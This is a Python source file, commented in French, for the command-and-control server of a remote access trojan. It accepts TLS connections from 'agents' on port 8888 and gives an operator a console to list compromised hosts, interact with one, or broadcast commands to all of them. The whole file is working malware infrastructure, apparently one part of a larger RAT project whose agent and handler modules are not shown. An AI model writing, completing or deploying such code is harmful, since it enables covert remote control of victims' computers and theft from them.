"""Serveur RAT - Accepte les connexions des agents et fournit une interface."""

import logging
import os
import select
import signal
import socket
import ssl
import sys
import threading
import time
from pathlib import Path
from typing import Dict, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from common.crypto import SecureSocket
from common.protocol import Message, MessageType
from server.handler import AgentHandler

logger = logging.getLogger(__name__)


class RATServer:
    """Serveur RAT multi-agents avec interface interactive."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8888):
        self.host = host
        self.port = port
        self.secure = SecureSocket()
        self.server_socket: Optional[socket.socket] = None
        self.running = False
        self.agents: Dict[int, AgentHandler] = {}
        self._next_agent_id = 1
        self._lock = threading.Lock()
        self._accept_thread: Optional[threading.Thread] = None

    def start(self) -> bool:
        """Démarre le serveur en écoute.

        Returns:
            True si le serveur démarre correctement
        """
        try:
            # Création de la socket TCP
            self.server_socket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM
            )
            self.server_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)

            self.running = True

            # Thread d'acceptation des connexions
            self._accept_thread = threading.Thread(
                target=self._accept_loop, daemon=True
            )
            self._accept_thread.start()

            logger.info(f"Serveur démarré sur {self.host}:{self.port}")
            print(f"\n[*] Listening on {self.port}...")
            print("[*] Tapez 'help' pour la liste des commandes\n")

            return True

        except OSError as e:
            logger.error(f"Erreur démarrage serveur : {e}")
            print(f"[!] Erreur : {e}")
            return False
        except Exception as e:
            logger.error(f"Erreur inattendue : {e}")
            return False

    def _accept_loop(self):
        """Boucle d'acceptation des connexions entrantes."""
        while self.running:
            try:
                raw_sock, addr = self.server_socket.accept()

                # Wrap avec TLS
                try:
                    tls_sock = self.secure.wrap_server_socket(raw_sock)
                except ssl.SSLError as e:
                    logger.warning(
                        f"Échec handshake TLS de {addr[0]}:{addr[1]} : {e}"
                    )
                    raw_sock.close()
                    continue

                # Création du handler
                with self._lock:
                    agent_id = self._next_agent_id
                    self._next_agent_id += 1

                handler = AgentHandler(
                    sock=tls_sock,
                    agent_id=agent_id,
                    addr=addr,
                    on_disconnect=self._remove_agent,
                )

                with self._lock:
                    self.agents[agent_id] = handler

                logger.info(
                    f"Nouvel agent #{agent_id} connecté depuis {addr[0]}:{addr[1]}"
                )
                print(f"\n[+] Agent received ! (ID: {agent_id})")
                print(f"[+] Adresse : {addr[0]}:{addr[1]}")
                print("rat > ", end="", flush=True)

            except socket.timeout:
                continue
            except OSError as e:
                if self.running:
                    logger.error(f"Erreur accept : {e}")
                continue
            except Exception as e:
                logger.error(f"Erreur accept inattendue : {e}")
                continue

    def _remove_agent(self, agent_id: int):
        """Retire un agent de la liste."""
        with self._lock:
            if agent_id in self.agents:
                del self.agents[agent_id]
                logger.info(f"Agent {agent_id} retiré de la liste")

    def _list_agents(self):
        """Affiche la liste des agents connectés."""
        with self._lock:
            if not self.agents:
                print("[*] Aucun agent connecté")
                return

            print(f"\n[*] Agents connectés ({len(self.agents)}) :")
            for agent_id, handler in self.agents.items():
                info = handler.info
                print(
                    f"  Agent {agent_id} - "
                    f"{info['host']}:{info['port']} - "
                    f"Connecté depuis {info['connected_at']}"
                )

    def _interact_agent(self, agent_id_str: str):
        """Entre en mode interactif avec un agent spécifique.

        Args:
            agent_id_str: ID de l'agent (ex: "1", "agent1")
        """
        # Extraction du numéro d'agent
        agent_id_str = agent_id_str.lower().replace("agent", "").strip()
        if not agent_id_str.isdigit():
            print("[!] Format : interact <agent_id>")
            print("[!] Exemple : interact 1 ou interact agent1")
            return

        agent_id = int(agent_id_str)

        with self._lock:
            handler = self.agents.get(agent_id)

        if not handler:
            print(f"[!] Agent {agent_id} introuvable")
            return

        handler.interact()

    def _show_help(self):
        """Affiche l'aide des commandes serveur."""
        print("""
=== Commandes serveur ===
help                          - Affiche cette aide
sessions / list               - Liste les agents connectés
interact <id>                 - Mode interactif avec un agent
interact agent<id>            - Mode interactif (variante)
broadcast <commande>          - Envoie une commande à tous les agents
exit / quit                   - Arrête le serveur
""")

    def _broadcast(self, cmd_args: str):
        """Envoie une commande à tous les agents.

        Args:
            cmd_args: Commande à envoyer
        """
        if not cmd_args:
            print("[!] Usage : broadcast <commande>")
            return

        with self._lock:
            agents_copy = dict(self.agents)

        if not agents_copy:
            print("[!] Aucun agent connecté")
            return

        print(f"[*] Envoi de '{cmd_args}' à {len(agents_copy)} agent(s)...")

        for agent_id, handler in agents_copy.items():
            try:
                command_parts = cmd_args.split()
                cmd = command_parts[0].lower()

                # On traite via le handler
                handler._execute_command(cmd_args)

            except Exception as e:
                print(f"[!] Agent {agent_id} : {e}")

    def _cleanup(self):
        """Nettoie les ressources avant arrêt."""
        logger.info("Arrêt du serveur...")
        print("\n[*] Arrêt du serveur...")

        self.running = False

        # Déconnexion de tous les agents
        with self._lock:
            agents_copy = dict(self.agents)

        for agent_id, handler in agents_copy.items():
            handler.disconnect()

        # Fermeture de la socket serveur
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass

        logger.info("Serveur arrêté")
        print("[*] Serveur arrêté")

    def run(self):
        """Boucle principale du serveur avec l'interface interactive."""
        if not self.start():
            return

        try:
            while self.running:
                try:
                    cmd_line = input("rat > ").strip()

                    if not cmd_line:
                        continue

                    cmd = cmd_line.lower().split()[0]
                    args = cmd_line[len(cmd) :].strip()

                    if cmd in ("exit", "quit", "q"):
                        break

                    elif cmd in ("help", "?"):
                        self._show_help()

                    elif cmd in ("sessions", "list", "agents"):
                        self._list_agents()

                    elif cmd == "interact":
                        self._interact_agent(args)

                    elif cmd == "broadcast":
                        self._broadcast(args)

                    else:
                        print(
                            f"[!] Commande inconnue : {cmd}. "
                            f"Tapez 'help' pour la liste."
                        )

                except KeyboardInterrupt:
                    print("\n[!] Ctrl+C détecté")
                    break
                except EOFError:
                    break
                except Exception as e:
                    logger.error(f"Erreur interface : {e}")
                    print(f"[!] Erreur : {e}")

        finally:
            self._cleanup()


def setup_logging(debug: bool = False):
    """Configure le logging."""
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="[%(asctime)s] %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


def main():
    import argparse

    parser = argparse.ArgumentParser(description="RAT Server")
    parser.add_argument(
        "--host", default="0.0.0.0", help="Adresse d'écoute"
    )
    parser.add_argument(
        "--port", type=int, default=8888, help="Port d'écoute"
    )
    parser.add_argument(
        "--debug", action="store_true", help="Mode debug"
    )
    args = parser.parse_args()

    setup_logging(args.debug)

    server = RATServer(host=args.host, port=args.port)
    server.run()


if __name__ == "__main__":
    main()